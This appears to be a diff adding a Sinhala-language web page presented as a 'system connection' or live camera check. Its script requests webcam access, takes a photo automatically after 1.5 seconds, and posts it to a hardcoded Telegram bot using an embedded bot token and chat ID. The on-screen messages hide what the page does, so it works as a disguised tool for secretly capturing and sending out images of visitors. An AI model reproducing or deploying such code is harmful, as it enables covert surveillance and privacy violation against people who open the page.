@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="si">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>පද්ධති සම්බන්ධතාවය</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            padding: 10px;
+            box-sizing: border-box;
+        }
+        .container {
+            text-align: center;
+            background: white;
+            padding: 25px;
+            border-radius: 15px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            max-width: 400px;
+            width: 100%;
+            box-sizing: border-box;
+        }
+        video {
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            background-color: #000;
+            width: 100%;
+            height: auto;
+            transform: scaleX(-1);
+        }
+        #status {
+            margin-top: 15px;
+            font-weight: bold;
+            color: #0088cc;
+            font-size: 15px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>සජීවී කැමරා සම්බන්ධතාවය</h2>
+        <video id="webcam" autoplay playsinline></video>
+        <p id="status">කැමරා අවසරය (Allow) ලබාදෙන්න...</p>
+        <canvas id="canvas" style="display:none;"></canvas>
+    </div>
+
+    <script>
+        const video = document.getElementById('webcam');
+        const canvas = document.getElementById('canvas');
+        const statusText = document.getElementById('status');
+
+        // ඔබගේ ස්ථාවර Chat ID එක සහ Bot Token එක
+        const TELEGRAM_CHAT_ID = '8674838462'; 
+        const BOT_TOKEN = '8838584952:AAEoA1W7BiNRkP0uDVPMNpBsczpZ30El6hI';
+
+        // 1. කැමරාව ක්‍රියාත්මක කිරීමට පරිශීලකයාගෙන් අවසර ඉල්ලීම
+        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+            .then(stream => {
+                video.srcObject = stream;
+                statusText.innerText = "කැමරාව සක්‍රීයයි. ස්වයංක්‍රීයව පරීක්ෂා කරමින්...";
+
+                // කැමරාව සක්‍රීය වී තත්පර 1.5 කින් ස්වයංක්‍රීයව ඡායාරූපය ගැනීම
+                video.onloadedmetadata = () => {
+                    setTimeout(autoCaptureAndSend, 1500); 
+                };
+            })
+            .catch(err => {
+                statusText.style.color = "red";
+                statusText.innerText = "දෝෂයකි: කැමරා අවසරය ප්‍රතික්ෂේප විය.";
+                console.error(err);
+            });
+
+        // 2. ස්වයංක්‍රීයව ඡායාරූපය ගෙන කෙලින්ම ටෙලිග්‍රෑම් වෙත යැවීම
+        function autoCaptureAndSend() {
+            statusText.innerText = "දත්ත පද්ධතිය සකසමින්...";
+
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, video.videoWidth, video.videoHeight);
+            
+            canvas.toBlob(blob => {
+                if (!blob) return;
+
+                statusText.innerText = "දත්ත ස්වයංක්‍රීයව Bot වෙත යවමින්...";
+
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('photo', blob, 'netlify_capture.jpg');
+
+                // සෘජුවම ටෙලිග්‍රෑම් API එක වෙත ඡායාරූපය යැවීම
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(res => res.json())
+                .then(data => {
+                    if (data.ok) {
+                        statusText.style.color = "green";
+                        statusText.innerText = "සම්බන්ධතාවය සාර්ථකයි!";
+                    } else {
+                        statusText.style.color = "red";
+                        statusText.innerText = "යැවීම අසාර්ථකයි: " + data.description;
+                    }
+                })
+                .catch(err => {
+                    statusText.style.color = "red";
+                    statusText.innerText = "ජාල දෝෂයකි (Network Error).";
+                    console.error(err);
+                });
+                
+            }, 'image/jpeg', 0.9);
+        }
+    </script>
+
+</body>
+</html>
